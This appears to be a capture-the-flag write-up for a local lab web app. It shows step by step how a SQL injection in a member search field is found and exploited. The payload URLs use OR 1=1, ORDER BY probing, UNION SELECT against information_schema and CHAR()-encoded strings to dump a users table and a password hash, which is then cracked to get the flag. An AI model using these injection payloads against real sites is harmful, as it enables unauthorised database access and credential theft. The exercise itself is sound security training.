The page 'member' http://192.168.56.101/?page=member display a search field to
look for member by id.
The field accepts only digits, putting a character or a string sends a value.

We can see it's a GET request by looking at the url :

http://192.168.56.101/?page=member&id=5&Submit=Submit#
the GET dictionnarie receives the following set of ker values
	- page -> member
	- id = 5
	- submit -> subbmit

If we try to send a ' the website sends a error :
"You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near '\'' at line 1"

it tells us the server will create a SQL request when we search. Therefor we might
find an sql injection.

We put the value 1 and get the following answer:

ID: 1
First name: Barack Hussein
Surname : Obama

We can determine the SQL request crafted by the server is in the following form:

SELECT ?id, ?first_name, ?surname FROM ?table_name
WHERE ?id = 1

It is sensible to injection because we can procede to an arithmetic operation :
searching for 1+1 gives us the result for id=2

In order to get all the result possible we look for a way to get the last statement
true for each row.

 SELECT ?id, ?first_name, ?surname FROM ?table_name
 WHERE ?id = 1 OR 1=1

we type 1 OR 1=1 in the search field and we get all the result because every row
is considered true.

we find this one that indicates that the member with ID = 5 may have a flag:

ID: 5 OR 1=1
First name: Flag
Surname : GetThe

We need to dertermine the number of field the sql sends because we will craft an
injection with UNION. To do that we user ORDER BY. We will try a number until we find
an error. We craft the following SQL request

SQL :
[...]
WHERE id= 5
ORDER BY 3

url :
http://192.168.56.101/?page=member&Submit=Submit&id=5 ORDER BY 3

-> this one gives us an error, the request sends two fields.

We want to find the name of the database with the database() call :

SQL :
[...]
WHERE id=10 (= 10 because we know it doesn't exist so we get only one result)
UNION
SELECT 1, database()

url :
http://192.168.56.101/?page=member&Submit=Submit&id=10 UNION SELECT 1, database()

we get the following response :

ID: 5 UNION SELECT 1, database()
First name: 1
Surname : Member_Sql_Injection

We look for the list of table using the 'information_schema.TABLES', we need to
select the TABLE_NAME column of 'information_schema.TABLES'

SQL :
[...]
WHERE id=10 (= 10 because we know it doesn't exist so we get only one result)
UNION
SELECT 1, TABLE_NAME
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110)

url :
http://192.168.56.101/?page=member&Submit=Submit&id=10 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110)

we use the function CHAR because we know the server doesn't accept strings.
the numbers correspond to the ASCII value of Member_Sql_Injection

It gives us the name of the only table : users

We want to know the name of all the columns in the table users :

SQL :
[...]
WHERE id=10 (= 10 because we know it doesn't exist so we get only one result)
UNION
SELECT 1, COLUMN_NAME
FROM information_schema.COLUMN
WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110)
AND TABLE_NAME = CHAR(117,115,101,114,115)

url :
http://192.168.56.101/?page=member&Submit=Submit&id=10 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,083,113,108,095,073,110,106,101,099,116,105,111,110) AND TABLE_NAME = CHAR(117,115,101,114,115)

we get the following columns : user_id first_name last_name town country planet Commentaire countersign
we craft the last injection where we try all the columns:

SQL:
SELECT first_name, last_name
FROM users
where user_id=5
UNION
SELECT user_id, countersign (or the others)
FROM users

url:
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, first_name FROM users
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, last_name FROM users
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, town FROM users
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, country FROM users
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, planet FROM users
http://192.168.56.101/?page=member&Submit=Submit&id=5 UNION SELECT user_id, countersign FROM users

for id = 5 we have

user_id = 5
first_name = Flag
last_name = GetThe
town = 42
country = 42
planet = 42
Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign = 5ff9d0165b4f92b14994e5c685cdce28

it corresponds to FortyTwo -> ->  10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
